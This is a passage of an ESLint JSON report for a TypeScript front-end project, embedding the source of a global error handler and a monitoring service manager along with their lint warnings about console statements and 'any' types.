console.group('ðŸ”´ Unhandled Promise Rejection');\n      console.error('Promise rejection:', event.reason);\n      console.log('Classification:', classification);\n      console.groupEnd();\n    }\n\n    // Show user feedback for critical errors\n    if (this.config.enableUserFeedback && classification.severity === 'critical' && classification.userMessage) {\n      this.showUserErrorFeedback(classification.userMessage);\n    }\n\n    // Prevent default handling if configured\n    if (this.config.preventDefaultHandling) {\n      event.preventDefault();\n    }\n\n    this.incrementErrorCount();\n  }\n\n  /**\n   * Handle resource loading errors\n   */\n  private handleResourceError(event: ErrorEvent): void {\n    const target = event.target as HTMLElement;\n    \n    // Only handle resource errors (img, script, link, etc.)\n    if (!target || target === window || !('src' in target || 'href' in target)) {\n      return;\n    }\n\n    if (!this.shouldHandleError()) return;\n\n    const resourceUrl = (target as any).src || (target as any).href || 'unknown';\n    const resourceType = target.tagName?.toLowerCase() || 'unknown';\n    \n    const error = new Error(`Failed to load ${resourceType}: ${resourceUrl}`);\n    const classification = this.classifyError(error, 'resource');\n\n    // Add breadcrumb\n    errorReporting.addBreadcrumb({\n      message: 'Resource loading error',\n      category: 'resource',\n      level: 'warning',\n      data: {\n        resourceUrl,\n        resourceType,\n        tagName: target.tagName\n      }\n    });\n\n    // Report the error\n    if (classification.shouldReport) {\n      errorReporting.reportError(error, {\n        severity: 'warning',\n        context: {\n          resourceUrl,\n          resourceType,\n          tagName: target.tagName,\n          outerHTML: target.outerHTML?.substring(0, 200),\n          timestamp: Date.now()\n        },\n        tags: {\n          source: 'global',\n          type: 'resource_error',\n          category: 'resource',\n          resourceType\n        }\n      });\n    }\n\n    // Track telemetry\n    if (this.config.enableTelemetryIntegration) {\n      telemetry.trackEvent({\n        name: 'resource_load_error',\n        properties: {\n          resourceUrl,\n          resourceType,\n          tagName: target.tagName\n        }\n      });\n    }\n\n    // Console logging\n    if (this.config.reportToConsole) {\n      console.warn('ðŸ”´ Resource Load Error:', {\n        type: resourceType,\n        url: resourceUrl,\n        element: target\n      });\n    }\n\n    this.incrementErrorCount();\n  }\n\n  /**\n   * Handle Content Security Policy violations\n   */\n  private handleSecurityViolation(event: SecurityPolicyViolationEvent): void {\n    if (!this.shouldHandleError()) return;\n\n    const error = new Error(`CSP Violation: ${event.violatedDirective}`);\n\n    // Add breadcrumb\n    errorReporting.addBreadcrumb({\n      message: 'Content Security Policy violation',\n      category: 'security',\n      level: 'error',\n      data: {\n        violatedDirective: event.violatedDirective,\n        blockedURI: event.blockedURI,\n        documentURI: event.documentURI\n      }\n    });\n\n    // Report the error\n    errorReporting.reportError(error, {\n      severity: 'error',\n      context: {\n        violatedDirective: event.violatedDirective,\n        blockedURI: event.blockedURI,\n        documentURI: event.documentURI,\n        originalPolicy: event.originalPolicy,\n        effectiveDirective: event.effectiveDirective,\n        timestamp: Date.now()\n      },\n      tags: {\n        source: 'global',\n        type: 'csp_violation',\n        category: 'security',\n        directive: event.violatedDirective\n      }\n    });\n\n    // Track telemetry\n    if (this.config.enableTelemetryIntegration) {\n      telemetry.trackEvent({\n        name: 'csp_violation',\n        properties: {\n          violatedDirective: event.violatedDirective,\n          blockedURI: event.blockedURI,\n          documentURI: event.documentURI\n        }\n      });\n    }\n\n    // Console logging\n    if (this.config.reportToConsole) {\n      console.error('ðŸ”´ CSP Violation:', {\n        directive: event.violatedDirective,\n        blockedURI: event.blockedURI,\n        policy: event.originalPolicy\n      });\n    }\n\n    this.incrementErrorCount();\n  }\n\n  /**\n   * Setup performance monitoring\n   */\n  private setupPerformanceMonitoring(): void {\n    if (!this.config.enablePerformanceMonitoring) return;\n\n    // Monitor long tasks\n    if ('PerformanceObserver' in window) {\n      try {\n        const longTaskObserver = new PerformanceObserver((list) => {\n          list.getEntries().forEach((entry) => {\n            if (entry.duration > 50) { // Tasks longer than 50ms\n              if (this.config.enableTelemetryIntegration) {\n                telemetry.trackPerformance({\n                  name: 'long_task',\n                  value: entry.duration,\n                  unit: 'ms',\n                  tags: {\n                    type: 'performance',\n                    entryType: entry.entryType\n                  }\n                });\n              }\n\n              // Report as warning if task is extremely long\n              if (entry.duration > 500) {\n                const error = new Error(`Long task detected: ${entry.duration}ms`);\n                errorReporting.reportError(error, {\n                  severity: 'warning',\n                  context: {\n                    duration: entry.duration,\n                    startTime: entry.startTime,\n                    entryType: entry.entryType\n                  },\n                  tags: {\n                    source: 'global',\n                    type: 'performance',\n                    category: 'performance'\n                  }\n                });\n              }\n            }\n          });\n        });\n\n        longTaskObserver.observe({ entryTypes: ['longtask'] });\n      } catch (error) {\n        console.warn('Long task observer not supported:', error);\n      }\n    }\n\n    // Monitor memory usage\n    if ('memory' in performance) {\n      setInterval(() => {\n        const memInfo = (performance as any).memory;\n        if (memInfo) {\n          const usedPercent = (memInfo.usedJSHeapSize / memInfo.jsHeapSizeLimit) * 100;\n          \n          if (this.config.enableTelemetryIntegration) {\n            telemetry.trackPerformance({\n              name: 'memory_usage',\n              value: usedPercent,\n              unit: 'percent',\n              tags: { type: 'memory' }\n            });\n          }\n\n          // Report high memory usage\n          if (usedPercent > 85) {\n            const error = new Error(`High memory usage detected: ${usedPercent.toFixed(1)}%`);\n            errorReporting.reportError(error, {\n              severity: 'warning',\n              context: {\n                usedJSHeapSize: memInfo.usedJSHeapSize,\n                totalJSHeapSize: memInfo.totalJSHeapSize,\n                jsHeapSizeLimit: memInfo.jsHeapSizeLimit,\n                usagePercent: usedPercent\n              },\n              tags: {\n                source: 'global',\n                type: 'performance',\n                category: 'memory'\n              }\n            });\n          }\n        }\n      }, 30000); // Check every 30 seconds\n    }\n  }\n\n  /**\n   * Classify error based on type and content\n   */\n  private classifyError(error: Error, initialCategory: ClassifiedError['category']): ClassifiedError {\n    const message = error.message.toLowerCase();\n    const stack = error.stack?.toLowerCase() || '';\n\n    // Network errors\n    if (message.includes('network') || message.includes('fetch') || message.includes('cors')) {\n      return {\n        category: 'network',\n        severity: 'medium',\n        isRecoverable: true,\n        shouldReport: true,\n        userMessage: 'Network connection issue. Please check your internet connection.'\n      };\n    }\n\n    // Resource loading errors\n    if (message.includes('loading chunk') || message.includes('script error')) {\n      return {\n        category: 'resource',\n        severity: 'low',\n        isRecoverable: true,\n        shouldReport: false // Too noisy for external reporting\n      };\n    }\n\n    // Security errors\n    if (message.includes('csp') || message.includes('security') || stack.includes('security')) {\n      return {\n        category: 'security',\n        severity: 'high',\n        isRecoverable: false,\n        shouldReport: true,\n        userMessage: 'Security policy violation detected.'\n      };\n    }\n\n    // Performance errors\n    if (message.includes('memory') || message.includes('timeout') || message.includes('long task')) {\n      return {\n        category: 'performance',\n        severity: 'medium',\n        isRecoverable: true,\n        shouldReport: true\n      };\n    }\n\n    // Critical JavaScript errors\n    if (error.name === 'ReferenceError' || error.name === 'TypeError') {\n      return {\n        category: 'javascript',\n        severity: 'high',\n        isRecoverable: false,\n        shouldReport: true,\n        userMessage: 'An unexpected error occurred. Please refresh the page.'\n      };\n    }\n\n    // Default classification\n    return {\n      category: initialCategory,\n      severity: 'medium',\n      isRecoverable: true,\n      shouldReport: true\n    };\n  }\n\n  /**\n   * Check if we should handle this error (rate limiting)\n   */\n  private shouldHandleError(): boolean {\n    if (!this.isInitialized) return false;\n\n    // Clean old timestamps\n    const now = Date.now();\n    this.errorTimestamps = this.errorTimestamps.filter(\n      timestamp => now - timestamp < this.config.errorTimeWindow\n    );\n\n    // Check if we've exceeded the error threshold\n    if (this.errorTimestamps.length >= this.config.errorThreshold) {\n      console.warn('ðŸš« Error handling disabled due to high error rate');\n      return false;\n    }\n\n    return true;\n  }\n\n  /**\n   * Increment error count and track timestamp\n   */\n  private incrementErrorCount(): void {\n    this.errorCount++;\n    this.errorTimestamps.push(Date.now());\n  }\n\n  /**\n   * Map classification severity to error reporting severity\n   */\n  private mapSeverityToErrorSeverity(severity: ClassifiedError['severity']): 'fatal' | 'error' | 'warning' | 'info' {\n    const severityMap: Record<ClassifiedError['severity'], 'fatal' | 'error' | 'warning' | 'info'> = {\n      'critical': 'fatal',\n      'high': 'error',\n      'medium': 'warning',\n      'low': 'info'\n    };\n    return severityMap[severity];\n  }\n\n  /**\n   * Show user error feedback\n   */\n  private showUserErrorFeedback(message: string): void {\n    // Create a non-intrusive notification\n    const notification = document.createElement('div');\n    notification.style.cssText = `\n      position: fixed;\n      top: 20px;\n      right: 20px;\n      background: #ff4444;\n      color: white;\n      padding: 12px 16px;\n      border-radius: 8px;\n      box-shadow: 0 4px 12px rgba(0,0,0,0.3);\n      z-index: 10000;\n      font-family: system-ui, -apple-system, sans-serif;\n      font-size: 14px;\n      max-width: 300px;\n      opacity: 0;\n      transition: opacity 0.3s ease;\n    `;\n    notification.textContent = message;\n\n    document.body.appendChild(notification);\n\n    // Fade in\n    setTimeout(() => notification.style.opacity = '1', 10);\n\n    // Auto-remove after 5 seconds\n    setTimeout(() => {\n      notification.style.opacity = '0';\n      setTimeout(() => document.body.removeChild(notification), 300);\n    }, 5000);\n  }\n\n  /**\n   * Get current error handler status\n   */\n  getStatus() {\n    return {\n      isInitialized: this.isInitialized,\n      errorCount: this.errorCount,\n      recentErrorCount: this.errorTimestamps.length,\n      config: this.config\n    };\n  }\n\n  /**\n   * Reset error count (useful for testing)\n   */\n  resetErrorCount(): void {\n    this.errorCount = 0;\n    this.errorTimestamps = [];\n  }\n\n  /**\n   * Cleanup and remove error handlers\n   */\n  destroy(): void {\n    // Remove event listeners\n    window.removeEventListener('error', this.handleGlobalError.bind(this), true);\n    window.removeEventListener('unhandledrejection', this.handleUnhandledRejection.bind(this), true);\n    document.removeEventListener('securitypolicyviolation', this.handleSecurityViolation.bind(this));\n\n    // Restore original handlers\n    window.onerror = this.originalErrorHandler || null;\n    window.onunhandledrejection = this.originalRejectionHandler || null;\n\n    this.isInitialized = false;\n    console.log('ðŸ›¡ï¸ Global error handler destroyed');\n  }\n}\n\n// Global instance\nexport const globalErrorHandler = new GlobalErrorHandler();\n\n// Types are already exported with their declarations","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/lib/services/monitoring.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":41,"column":28,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":41,"endColumn":31,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1469,1472],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1469,1472],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":65,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":65,"endColumn":16,"suggestions":[{"fix":{"range":[2106,2160],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":79,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":79,"endColumn":21,"suggestions":[{"fix":{"range":[2557,2640],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":111,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":111,"endColumn":18,"suggestions":[{"fix":{"range":[3755,3817],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":115,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":115,"endColumn":22,"suggestions":[{"fix":{"range":[3925,3970],"text":""},"messageId":"removeConsole","data":{"propertyName":"group"},"desc":"Remove the console.group()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":116,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":116,"endColumn":20,"suggestions":[{"fix":{"range":[3979,4053],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":117,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":117,"endColumn":20,"suggestions":[{"fix":{"range":[4062,4125],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":118,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":118,"endColumn":20,"suggestions":[{"fix":{"range":[4134,4222],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":119,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":119,"endColumn":20,"suggestions":[{"fix":{"range":[4231,4280],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":120,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":120,"endColumn":25,"suggestions":[{"fix":{"range":[4289,4308],"text":""},"messageId":"removeConsole","data":{"propertyName":"groupEnd"},"desc":"Remove the console.groupEnd()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":126,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":126,"endColumn":20,"suggestions":[{"fix":{"range":[4471,4504],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":135,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":135,"endColumn":16,"suggestions":[{"fix":{"range":[4677,4733],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":144,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":144,"endColumn":18,"suggestions":[{"fix":{"range":[4913,4977],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":146,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":146,"endColumn":20,"suggestions":[{"fix":{"range":[5006,5076],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":155,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":155,"endColumn":16,"suggestions":[{"fix":{"range":[5195,5247],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":176,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":176,"endColumn":18,"suggestions":[{"fix":{"range":[5799,5859],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":178,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":178,"endColumn":20,"suggestions":[{"fix":{"range":[5888,5953],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":209,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":209,"endColumn":16,"suggestions":[{"fix":{"range":[6638,6696],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":219,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":219,"endColumn":18,"suggestions":[{"fix":{"range":[6968,7026],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":221,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":221,"endColumn":20,"suggestions":[{"fix":{"range":[7055,7119],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":229,"column":24,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":229,"endColumn":27,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[7223,7226],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[7223,7226],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":251,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":251,"endColumn":18,"suggestions":[{"fix":{"range":[7864,7917],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":255,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":255,"endColumn":20,"suggestions":[{"fix":{"range":[8068,8101],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":263,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":263,"endColumn":18,"suggestions":[{"fix":{"range":[8307,8354],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":267,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":267,"endColumn":20,"suggestions":[{"fix":{"range":[8499,8532],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":275,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":275,"endColumn":18,"suggestions":[{"fix":{"range":[8759,8809],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":279,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":279,"endColumn":20,"suggestions":[{"fix":{"range":[8965,8998],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'config' is defined but never used.","line":284,"column":33,"nodeType":null,"messageId":"unusedVar","endLine":284,"endColumn":39},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":287,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":287,"endColumn":19,"suggestions":[{"fix":{"range":[9220,9272],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":295,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":295,"endColumn":21,"suggestions":[{"fix":{"range":[9458,9511],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":315,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":315,"endColumn":18,"suggestions":[{"fix":{"range":[10160,10235],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":31,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Monitoring Service Initialization (2025)\n * \n * Central initialization and management of all monitoring services including\n * error reporting, telemetry, and global error handling.\n * \n * Following 2025 patterns for service orchestration and lifecycle management.\n */\n\nimport { errorReporting, type ErrorReportingConfig } from './errorReporting';\nimport { telemetry, type TelemetryConfig } from './telemetry';\nimport { globalErrorHandler, type GlobalErrorHandlerConfig } from './globalErrorHandler';\nimport { \n  createMonitoringConfig, \n  validateMonitoringConfig,\n  checkMonitoringHealth,\n  getMonitoringDebugInfo,\n  type MonitoringConfig,\n  type UserMonitoringSettings,\n  type MonitoringHealthStatus\n} from '../config/monitoring';\n\n// Service initialization state\nexport interface MonitoringServiceState {\n  isInitialized: boolean;\n  initializationTime: Date | null;\n  lastHealthCheck: Date | null;\n  healthStatus: MonitoringHealthStatus | null;\n  config: MonitoringConfig | null;\n  errors: string[];\n}\n\n// Service management interface\nexport interface MonitoringServiceManager {\n  initialize: (userSettings?: UserMonitoringSettings) => Promise<void>;\n  reinitialize: (userSettings?: UserMonitoringSettings) => Promise<void>;\n  destroy: () => Promise<void>;\n  getState: () => MonitoringServiceState;\n  getHealthStatus: () => Promise<MonitoringHealthStatus>;\n  updateUserSettings: (settings: UserMonitoringSettings) => Promise<void>;\n  exportDiagnostics: () => any;\n}\n\n/**\n * Monitoring Service Manager\n * Orchestrates all monitoring services with proper lifecycle management\n */\nclass MonitoringServiceManagerImpl implements MonitoringServiceManager {\n  private state: MonitoringServiceState = {\n    isInitialized: false,\n    initializationTime: null,\n    lastHealthCheck: null,\n    healthStatus: null,\n    config: null,\n    errors: []\n  };\n\n  private healthCheckInterval?: NodeJS.Timeout;\n  private readonly HEALTH_CHECK_INTERVAL = 5 * 60 * 1000; // 5 minutes\n\n  /**\n   * Initialize all monitoring services\n   */\n  async initialize(userSettings: UserMonitoringSettings = {}): Promise<void> {\n    console.log('ðŸš€ Initializing monitoring services...');\n    \n    try {\n      // Reset state\n      this.state.errors = [];\n      \n      // Create configuration\n      const config = createMonitoringConfig(userSettings);\n      this.state.config = config;\n\n      // Validate configuration\n      const validationErrors = validateMonitoringConfig(config);\n      if (validationErrors.length > 0) {\n        this.state.errors.push(...validationErrors);\n        console.warn('âš ï¸ Monitoring configuration validation warnings:', validationErrors);\n      }\n\n      // Initialize services in order\n      await this.initializeErrorReporting(config.errorReporting);\n      await this.initializeTelemetry(config.telemetry);\n      await this.initializeGlobalErrorHandler(config.globalErrorHandler);\n\n      // Set up health monitoring\n      this.setupHealthMonitoring(config);\n\n      // Mark as initialized\n      this.state.isInitialized = true;\n      this.state.initializationTime = new Date();\n\n      // Track initialization\n      if (config.featureFlags.enableTelemetry) {\n        telemetry.trackEvent({\n          name: 'monitoring_services_initialized',\n          properties: {\n            environment: config.environment,\n            enabledServices: {\n              errorReporting: config.featureFlags.enableErrorReporting,\n              telemetry: config.featureFlags.enableTelemetry,\n              performanceMonitoring: config.featureFlags.enablePerformanceMonitoring\n            },\n            validationErrors: validationErrors.length,\n            initializationTime: Date.now() - this.state.initializationTime.getTime()\n          }\n        });\n      }\n\n      console.log('âœ… Monitoring services initialized successfully');\n      \n      // Log configuration in development\n      if (config.environment === 'development') {\n        console.group('ðŸ“Š Monitoring Configuration');\n        console.log('Error Reporting:', config.featureFlags.enableErrorReporting);\n        console.log('Telemetry:', config.featureFlags.enableTelemetry);\n        console.log('Performance Monitoring:', config.featureFlags.enablePerformanceMonitoring);\n        console.log('Sample Rates:', config.sampleRates);\n        console.groupEnd();\n      }\n\n    } catch (error) {\n      const errorMessage = `Failed to initialize monitoring services: ${error}`;\n      this.state.errors.push(errorMessage);\n      console.error('âŒ', errorMessage);\n      throw error;\n    }\n  }\n\n  /**\n   * Reinitialize services with new settings\n   */\n  async reinitialize(userSettings: UserMonitoringSettings = {}): Promise<void> {\n    console.log('ðŸ”„ Reinitializing monitoring services...');\n    \n    try {\n      // Destroy existing services\n      await this.destroy();\n      \n      // Initialize with new settings\n      await this.initialize(userSettings);\n      \n      console.log('âœ… Monitoring services reinitialized successfully');\n    } catch (error) {\n      console.error('âŒ Failed to reinitialize monitoring services:', error);\n      throw error;\n    }\n  }\n\n  /**\n   * Destroy all monitoring services\n   */\n  async destroy(): Promise<void> {\n    console.log('ðŸ›‘ Destroying monitoring services...');\n    \n    try {\n      // Stop health monitoring\n      if (this.healthCheckInterval) {\n        clearInterval(this.healthCheckInterval);\n        this.healthCheckInterval = undefined;\n      }\n\n      // Destroy services in reverse order\n      globalErrorHandler.destroy();\n      telemetry.destroy();\n      errorReporting.destroy();\n\n      // Reset state\n      this.state.isInitialized = false;\n      this.state.initializationTime = null;\n      this.state.lastHealthCheck = null;\n      this.state.healthStatus = null;\n      this.state.config = null;\n\n      console.log('âœ… Monitoring services destroyed successfully');\n    } catch (error) {\n      console.error('âŒ Failed to destroy monitoring services:', error);\n      throw error;\n    }\n  }\n\n  /**\n   * Get current service state\n   */\n  getState(): MonitoringServiceState {\n    return { ...this.state };\n  }\n\n  /**\n   * Get health status of all services\n   */\n  async getHealthStatus(): Promise<MonitoringHealthStatus> {\n    if (!this.state.config) {\n      throw new Error('Monitoring services not initialized');\n    }\n\n    const health = await checkMonitoringHealth(this.state.config);\n    this.state.healthStatus = health;\n    this.state.lastHealthCheck = new Date();\n    \n    return health;\n  }\n\n  /**\n   * Update user settings and reinitialize if needed\n   */\n  async updateUserSettings(settings: UserMonitoringSettings): Promise<void> {\n    console.log('âš™ï¸ Updating monitoring settings:', settings);\n    \n    try {\n      // Save settings to localStorage\n      const { saveUserSettings } = await import('../config/monitoring');\n      saveUserSettings(settings);\n      \n      // Reinitialize services with new settings\n      await this.reinitialize(settings);\n      \n      console.log('âœ… Monitoring settings updated successfully');\n    } catch (error) {\n      console.error('âŒ Failed to update monitoring settings:', error);\n      throw error;\n    }\n  }\n\n  /**\n   * Export comprehensive diagnostics\n   */\n  exportDiagnostics(): any {\n    return {\n      serviceState: this.state,\n      debugInfo: getMonitoringDebugInfo(),\n      serviceStatuses: {\n        errorReporting: errorReporting.getStatus(),\n        telemetry: telemetry.getStatus(),\n        globalErrorHandler: globalErrorHandler.getStatus()\n      },\n      offlineData: {\n        errors: errorReporting.exportOfflineErrors(),\n        telemetry: telemetry.exportOfflineData()\n      },\n      timestamp: new Date().toISOString()\n    };\n  }\n\n  // Private methods\n\n  private async initializeErrorReporting(config: ErrorReportingConfig): Promise<void> {\n    try {\n      await errorReporting.initialize(config);\n      console.log('âœ… Error reporting service initialized');\n    } catch (error) {\n      const errorMessage = `Error reporting initialization failed: ${error}`;\n      this.state.errors.push(errorMessage);\n      console.error('âŒ', errorMessage);\n      // Don't throw - allow other services to initialize\n    }\n  }\n\n  private async initializeTelemetry(config: TelemetryConfig): Promise<void> {\n    try {\n      await telemetry.initialize(config);\n      console.log('âœ… Telemetry service initialized');\n    } catch (error) {\n      const errorMessage = `Telemetry initialization failed: ${error}`;\n      this.state.errors.push(errorMessage);\n      console.error('âŒ', errorMessage);\n      // Don't throw - allow other services to initialize\n    }\n  }\n\n  private async initializeGlobalErrorHandler(config: GlobalErrorHandlerConfig): Promise<void> {\n    try {\n      globalErrorHandler.initialize(config);\n      console.log('âœ… Global error handler initialized');\n    } catch (error) {\n      const errorMessage = `Global error handler initialization failed: ${error}`;\n      this.state.errors.push(errorMessage);\n      console.error('âŒ', errorMessage);\n      // Don't throw - allow other services to initialize\n    }\n  }\n\n  private setupHealthMonitoring(config: MonitoringConfig): void {\n    // Perform initial health check\n    this.getHealthStatus().catch(error => {\n      console.warn('Initial health check failed:', error);\n    });\n\n    // Set up periodic health checks\n    this.healthCheckInterval = setInterval(async () => {\n      try {\n        await this.getHealthStatus();\n      } catch (error) {\n        console.warn('Periodic health check failed:', error);\n      }\n    }, this.HEALTH_CHECK_INTERVAL);\n  }\n}\n\n// Global monitoring service manager instance\nexport const monitoringService = new MonitoringServiceManagerImpl();\n\n// Convenience functions for direct service access\nexport const getErrorReportingService = () => errorReporting;\nexport const getTelemetryService = () => telemetry;\nexport const getGlobalErrorHandler = () => globalErrorHandler;\n\n// Auto-initialization flag - set to true to initialize on import\nconst AUTO_INITIALIZE = false;\n\nif (AUTO_INITIALIZE && typeof window !== 'undefined') {\n  // Auto-initialize in browser environment\n  monitoringService.initialize().catch(error => {\n    console.error('Auto-initialization of monitoring services failed:', error);\n  });\n}\n\n// Integration hooks for React components\nexport const useMonitoringServices = () => {\n  const [state, setState] = React.useState(monitoringService.getState());\n  \n  React.useEffect(() => {\n    // Update state when services change\n    const interval = setInterval(() => {\n      setState(monitoringService.getState());\n    }, 1000);\n    \n    return () => clearInterval(interval);\n  }, []);\n  \n  return {\n    ...state,\n    initialize: monitoringService.initialize.bind(monitoringService),\n    destroy: monitoringService.destroy.bind(monitoringService),\n    updateSettings: monitoringService.updateUserSettings.bind(monitoringService),\n    getHealth: monitoringService.getHealthStatus.bind(monitoringService),\n    exportDiagnostics: monitoringService.exportDiagnostics.bind(monitoringService)\n  };\n};\n\n// Manual initialization function for app startup\nexport const initializeMonitoring = async (userSettings?: UserMonitoringSettings): Promise<void> => {\n  return monitoringService.initialize(userSettings);\n};\n\n// Manual cleanup function for app shutdown\nexport const destroyMonitoring = async (): Promise<void> => {\n  return monitoringService.destroy();\n};\n\n// Export the manager implementation\nexport { MonitoringServiceManagerImpl };\n\n// Integration example for main app\nexport const getMonitoringInitializationExample = () => `\n// Example: Initialize monitoring in your main app component\n\nimport { initializeMonitoring, destroyMonitoring } from '@/lib/services/monitoring';\n\n// In your App.tsx or main component:\nuseEffect(() => {\n  const initServices = async () => {\n    try {\n      await initializeMonitoring({\n        enableErrorReporting: true,\n        enableTelemetry: true,\n        enablePerformanceMonitoring: true,\n        debugMode: process.env.NODE_ENV === 'development'\n      });\n    } catch (error) {\n      console.error('Failed to initialize monitoring:', error);\n    }\n  };\n\n  initServices();\n\n  // Cleanup on unmount\n  return () => {\n    destroyMonitoring().catch(console.error);\n  };\n}, 